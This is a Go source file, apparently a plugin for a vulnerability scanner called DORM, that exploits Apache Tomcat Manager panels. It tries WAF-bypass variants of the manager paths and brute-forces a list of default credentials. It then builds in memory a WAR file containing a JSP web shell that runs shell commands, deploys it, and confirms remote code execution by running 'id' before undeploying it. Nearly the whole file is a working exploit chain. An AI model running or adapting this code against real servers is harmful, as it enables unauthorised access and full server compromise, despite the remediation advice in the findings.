package plugins

import (
	"DORM/models"
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"strings"
)

// ==============================================================
// TOMCAT MANAGER — v3.0
// ==============================================================
type TomcatManagerPlugin struct{}

func (p *TomcatManagerPlugin) Name() string { return "Tomcat Manager Panel (Catalina Exploiter v3)" }

// ── Default Credentials Matrix (15+) ─────────────────────────────────────
var tomcatCreds = []struct{ User, Pass string }{
	{"tomcat", "s3cret"},
	{"tomcat", "tomcat"},
	{"tomcat", "password"},
	{"admin", "admin"},
	{"admin", "password"},
	{"admin", "s3cret"},
	{"admin", "tomcat"},
	{"admin", "admin123"},
	{"manager", "manager"},
	{"manager", "s3cret"},
	{"deployer", "deployer"},
	{"role1", "role1"},
	{"j2deployer", "j2deployer"},
	{"root", "root"},
	{"both", "tomcat"},
	{"ovwebusr", "OvW*busr1"},
	{"cxsdk", "kdsxc"},
	{"role", "changethis"},
	{"manager", "changethis"},
}

// ── URL Bypass Variants for Manager Endpoints ─────────────────────────────
var managerPaths = []string{
	"/manager/html",                  // standard
	"/manager/status",                // status page (sometimes different ACL)
	"/manager/text/list",             // text API (used for automated deploy)
	"/host-manager/html",             // host manager
	"//manager/html",                 // double-slash WAF bypass
	"/manager/%68tml",                // partial URL-encode ('h' → %68)
	"/.;/manager/html",               // Tomcat path traversal CVE bypass
	"/%2F%6D%61%6E%61%67%65%72/html", // full URL-encode bypass
	"/manager/html/",                 // trailing slash
}

// ── In-Memory WAR Shell Builder ───────────────────────────────────────────
// Builds a minimal .war archive entirely in memory (never written to disk).
// The shell is a JSP that reads a "cmd" query parameter and runs it.
const webXML = `<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.1">
  <servlet>
    <servlet-name>DORMShell</servlet-name>
    <jsp-file>/shell.jsp</jsp-file>
  </servlet>
  <servlet-mapping>
    <servlet-name>DORMShell</servlet-name>
    <url-pattern>/shell.jsp</url-pattern>
  </servlet-mapping>
</web-app>`

const shellJSP = `<%@ page import="java.io.*" %><%
  String cmd = request.getParameter("cmd");
  if (cmd != null && !cmd.isEmpty()) {
    ProcessBuilder pb = new ProcessBuilder(new String[]{"/bin/sh","-c",cmd});
    pb.redirectErrorStream(true);
    Process proc = pb.start();
    BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) sb.append(line).append("\n");
    out.print(sb.toString());
  }
%>`

func buildWARInMemory() ([]byte, error) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	addFile := func(name, content string) error {
		w, err := zw.Create(name)
		if err != nil {
			return err
		}
		_, err = w.Write([]byte(content))
		return err
	}

	if err := addFile("WEB-INF/web.xml", webXML); err != nil {
		return nil, err
	}
	if err := addFile("shell.jsp", shellJSP); err != nil {
		return nil, err
	}

	if err := zw.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// ── Deploy WAR via /manager/text/deploy ──────────────────────────────────
func deployWAR(client *http.Client, baseURL, contextPath string, warBytes []byte, user, pass string) bool {
	deployURL := fmt.Sprintf("%s/manager/text/deploy?path=/%s&update=true", baseURL, contextPath)

	req, err := http.NewRequest("PUT", deployURL, bytes.NewReader(warBytes))
	if err != nil {
		return false
	}
	req.SetBasicAuth(user, pass)
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()

	return resp.StatusCode == 200 && strings.HasPrefix(strings.TrimSpace(string(body)), "OK")
}

// ── Deploy via multipart HTML form (fallback) ─────────────────────────────
func deployWARForm(client *http.Client, baseURL, contextPath string, warBytes []byte, user, pass string) bool {
	var body bytes.Buffer
	mw := multipart.NewWriter(&body)

	// Mimics the Tomcat Manager HTML form POST
	_ = func() error {
		fw, err := mw.CreateFormFile("deployWar", contextPath+".war")
		if err != nil {
			return err
		}
		_, err = fw.Write(warBytes)
		return err
	}()
	mw.Close()

	deployURL := baseURL + "/manager/html/upload"
	req, err := http.NewRequest("POST", deployURL, &body)
	if err != nil {
		return false
	}
	req.SetBasicAuth(user, pass)
	req.Header.Set("Content-Type", mw.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
	resp.Body.Close()

	return resp.StatusCode == 200 && strings.Contains(string(respBody), contextPath)
}

// ── Undeploy (cleanup) ────────────────────────────────────────────────────
func undeployWAR(client *http.Client, baseURL, contextPath, user, pass string) {
	undeployURL := fmt.Sprintf("%s/manager/text/undeploy?path=/%s", baseURL, contextPath)
	req, _ := http.NewRequest("GET", undeployURL, nil)
	req.SetBasicAuth(user, pass)
	resp, err := client.Do(req)
	if err == nil {
		resp.Body.Close()
	}
}

// ── Verify RCE via deployed shell ─────────────────────────────────────────
func verifyRCE(client *http.Client, baseURL, contextPath, user, pass string) (bool, string) {
	shellURL := fmt.Sprintf("%s/%s/shell.jsp?cmd=id", baseURL, contextPath)
	req, _ := http.NewRequest("GET", shellURL, nil)
	req.SetBasicAuth(user, pass)

	resp, err := client.Do(req)
	if err != nil {
		return false, ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()

	output := string(body)
	if strings.Contains(output, "uid=") || strings.Contains(output, "NT AUTHORITY") {
		return true, strings.TrimSpace(output)
	}
	return false, ""
}

// ── Main plugin ───────────────────────────────────────────────────────────
func (p *TomcatManagerPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	// Context path for our shell deployment
	const shellContext = "dorm_" // final path: /dorm_

	// ── PHASE 1: Discover accessible manager panel (all URL variants) ──
	type panelAccess struct {
		URL        string
		AuthNeeded bool
		FreeAccess bool
	}

	var found *panelAccess

	for _, path := range managerPaths {
		fullURL := baseURL + path
		req, _ := http.NewRequest("GET", fullURL, nil)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
		resp.Body.Close()
		bodyStr := string(bodyBytes)
		authHeader := resp.Header.Get("WWW-Authenticate")

		isTomcat := strings.Contains(strings.ToLower(authHeader), "tomcat") ||
			strings.Contains(bodyStr, "Tomcat Web Application Manager") ||
			strings.Contains(bodyStr, "Apache Tomcat") ||
			strings.Contains(bodyStr, "manager")

		if resp.StatusCode == 200 && strings.Contains(bodyStr, "Tomcat Web Application Manager") {
			found = &panelAccess{URL: fullURL, FreeAccess: true}
			break
		}
		if resp.StatusCode == 401 && isTomcat {
			found = &panelAccess{URL: fullURL, AuthNeeded: true}
			break
		}
		// 403 + Tomcat body → still a lead
		if resp.StatusCode == 403 && isTomcat {
			found = &panelAccess{URL: fullURL, AuthNeeded: true}
		}
	}

	if found == nil {
		return nil
	}

	// ── PHASE 2: Unauthenticated access? ─────────────────────────────
	if found.FreeAccess {
		return &models.Vulnerability{
			Target:   target,
			Name:     "Tomcat Manager (Unauthenticated Access)",
			Severity: "CRITICAL",
			CVSS:     9.8,
			Description: fmt.Sprintf(
				"Tomcat Manager panel is accessible without authentication.\nURL: %s",
				found.URL,
			),
			Solution:  "Enable authentication and restrict access by IP.",
			Reference: "OWASP Misconfiguration / CWE-306",
		}
	}

	// ── PHASE 3: Credential brute-force ──────────────────────────────
	var validUser, validPass string
	for _, cred := range tomcatCreds {
		reqAuth, _ := http.NewRequest("GET", found.URL, nil)
		reqAuth.SetBasicAuth(cred.User, cred.Pass)

		respAuth, err := client.Do(reqAuth)
		if err != nil {
			continue
		}
		bodyAuth, _ := io.ReadAll(io.LimitReader(respAuth.Body, 65536))
		respAuth.Body.Close()

		if respAuth.StatusCode == 200 && strings.Contains(string(bodyAuth), "Tomcat") {
			validUser = cred.User
			validPass = cred.Pass
			break
		}
	}

	if validUser == "" {
		// Panel found but creds failed → still HIGH
		return &models.Vulnerability{
			Target:   target,
			Name:     "Tomcat Manager Panel Exposed",
			Severity: "HIGH",
			CVSS:     7.5,
			Description: fmt.Sprintf(
				"Tomcat Manager login panel is exposed to the internet.\nURL: %s\n"+
					"Tested %d default credential pairs — none succeeded.\n"+
					"Panel URL bypass variants used: %v",
				found.URL, len(tomcatCreds), managerPaths,
			),
			Solution:  "Restrict /manager endpoint via firewall/IP allowlisting.",
			Reference: "OWASP Security Misconfiguration",
		}
	}

	// ── PHASE 4: WAR Shell Deployment (RCE Escalation) ────────────────
	warBytes, err := buildWARInMemory()
	if err != nil || len(warBytes) == 0 {
		// Fall back to credential finding without RCE
		return buildCredVuln(target, found.URL, validUser, validPass)
	}

	deployed := deployWAR(client, baseURL, shellContext, warBytes, validUser, validPass)
	if !deployed {
		deployed = deployWARForm(client, baseURL, shellContext, warBytes, validUser, validPass)
	}

	if !deployed {
		return buildCredVuln(target, found.URL, validUser, validPass)
	}

	// ── Verify RCE ────────────────────────────────────────────────────
	rceConfirmed, cmdOutput := verifyRCE(client, baseURL, shellContext, validUser, validPass)

	// ── Cleanup: always undeploy the shell ────────────────────────────
	defer undeployWAR(client, baseURL, shellContext, validUser, validPass)

	if rceConfirmed {
		return &models.Vulnerability{
			Target:   target,
			Name:     "Tomcat Manager — RCE Confirmed via WAR Deployment",
			Severity: "CRITICAL",
			CVSS:     10.0,
			Description: fmt.Sprintf(
				"Full Remote Code Execution confirmed via Tomcat Manager WAR deployment.\n\n"+
					"Panel URL:    %s\nCredentials:  %s / %s\n"+
					"Shell Path:   /%s/shell.jsp?cmd=<CMD>\n\n"+
					"id command output:\n%s\n\n"+
					"Shell has been automatically undeployed after verification.",
				found.URL, validUser, validPass, shellContext, cmdOutput,
			),
			Solution:  "Disable Tomcat Manager in production. Restrict access by IP. Change all default credentials.",
			Reference: "CVE-2017-12615 / OWASP A05:2021 / CWE-78",
		}
	}

	// WAR deployed but RCE check inconclusive → still CRITICAL (deployment itself is RCE risk)
	return &models.Vulnerability{
		Target:   target,
		Name:     "Tomcat Manager — WAR Deployment Succeeded (RCE Risk)",
		Severity: "CRITICAL",
		CVSS:     9.8,
		Description: fmt.Sprintf(
			"Successfully deployed a WAR application to the Tomcat server using default credentials.\n\n"+
				"Panel URL:    %s\nCredentials:  %s / %s\n"+
				"Deployment:   WAR upload accepted (/%s)\n\n"+
				"Even if RCE command output was not captured, arbitrary WAR deployment\n"+
				"is equivalent to full server compromise. Shell has been undeployed.",
			found.URL, validUser, validPass, shellContext,
		),
		Solution:  "Disable Tomcat Manager in production. Restrict access by IP. Change all default credentials.",
		Reference: "CVE-2017-12615 / OWASP A05:2021",
	}
}

// ── Helper: return a CRITICAL credential-only finding ─────────────────────
func buildCredVuln(target models.ScanTarget, panelURL, user, pass string) *models.Vulnerability {
	return &models.Vulnerability{
		Target:   target,
		Name:     "Tomcat Manager (Default Credentials Verified)",
		Severity: "CRITICAL",
		CVSS:     9.8,
		Description: fmt.Sprintf(
			"Access granted to Tomcat Manager using default credentials.\n"+
				"URL:  %s\nUser: %s\nPass: %s\n\n"+
				"An authenticated manager session allows WAR deployment → Remote Code Execution.",
			panelURL, user, pass,
		),
		Solution:  "Change default credentials in tomcat-users.xml immediately.",
		Reference: "CVE-1999-0508 / CWE-1392",
	}
}
